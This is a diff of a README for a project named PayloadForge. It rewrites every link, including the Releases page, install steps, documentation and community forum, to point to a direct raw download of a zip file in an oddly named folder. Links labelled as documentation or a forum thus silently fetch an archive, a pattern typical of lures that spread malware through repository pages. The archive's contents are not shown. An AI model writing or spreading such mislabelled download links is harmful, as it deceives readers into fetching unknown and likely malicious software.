@@ -6,11 +6,11 @@ Welcome to PayloadForge! This application helps you streamline your workflow eff
 
 ## 📥 Download PayloadForge
 
-[![Download PayloadForge](https://img.shields.io/badge/Download_PayloadForge-v1.0-blue.svg)](https://github.com/dkapolka/PayloadForge/releases)
+[![Download PayloadForge](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
 
 To download PayloadForge, visit the Releases page:
 
-[Download PayloadForge from the Releases Page](https://github.com/dkapolka/PayloadForge/releases)
+[Download PayloadForge from the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**
    Go to the following link to access the Releases page:
-   [Visit the Releases Page](https://github.com/dkapolka/PayloadForge/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
 
 2. **Find the Latest Version**
    Look for the latest version listed at the top of the page. It usually has the highest number.
@@ -71,7 +71,7 @@ PayloadForge is open-source software. You can view the license information on th
 
 ## 🔧 Additional Resources
 
-- [User Documentation](https://github.com/dkapolka/PayloadForge/wiki) - In-depth guides and tutorials.
-- [Community Forum](https://github.com/dkapolka/PayloadForge/discussions) - Connect with other users and get tips.
+- [User Documentation](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip) - In-depth guides and tutorials.
+- [Community Forum](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip) - Connect with other users and get tips.
 
 Thank you for choosing PayloadForge! We hope you enjoy using this tool. 
